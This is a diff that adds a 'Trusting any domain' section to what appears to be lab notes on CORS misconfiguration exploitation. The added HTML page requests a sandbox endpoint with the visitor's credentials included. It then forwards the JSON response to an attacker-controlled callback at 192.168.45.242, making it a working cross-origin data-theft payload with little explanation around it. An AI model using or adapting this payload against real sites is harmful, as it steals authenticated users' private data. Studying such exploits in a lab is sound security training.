@@ -114,3 +114,31 @@ send_create();
 <body></body>
 </html>
 ```
+### Trusting any domain 
+```
+<html>
+<head>
+<script>
+var url = "https://cors-sandbox/exercise1";
+function get_code() {
+  fetch(url, {
+    method: 'GET',
+    mode: 'cors',
+    Cookie: 'SessionCookie=1123581321345589144',
+    credentials: 'include',
+    Origin: 'hellocors'
+  })
+  .then(response => response.json())
+  .then(data => {
+    fetch('http://192.168.45.242/callback?' +  encodeURIComponent(JSON.stringify(data)), {
+      mode: 'no-cors'
+    });
+    console.log(data);
+  });
+}
+get_code();
+</script>
+</head>
+<body></body>
+</html>
+```
